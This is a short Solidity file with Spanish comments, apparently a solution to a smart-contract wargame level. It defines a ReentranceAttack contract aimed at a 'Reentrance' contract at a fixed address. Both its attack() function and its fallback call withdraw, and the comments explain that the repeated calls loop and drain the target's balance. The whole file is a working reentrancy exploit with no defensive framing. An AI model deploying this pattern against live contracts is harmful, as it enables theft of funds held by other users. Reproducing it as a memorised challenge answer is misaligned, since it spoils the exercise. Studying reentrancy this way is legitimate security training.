// SPDX-License-Identifier: MIT
// La idea es:
// 1. Depositar al contrato Reentance.sol con ayuda de la funcion donate para el address ReentranceAttack.sol, depositamos 0.002
// 2. Hacer withDraw desde ReentranceAttack.sol con ayuda de attack()
// 3. Va a caer en mi funcion fallback y se vuelve a llamar withDraw.
// 4. Caeremos en un bucle.
pragma solidity ^0.7.0;
import "./Reentrance.sol";


contract ReentranceAttack {
    Reentrance reentrance = Reentrance(0x4811A1976c3b40946fBaba07b0dEe25323D5C7BB);

    fallback() external payable {
        reentrance.withdraw(1000000000000000);
    }

    function attack() public{
        reentrance.withdraw(1000000000000000);
    }
}
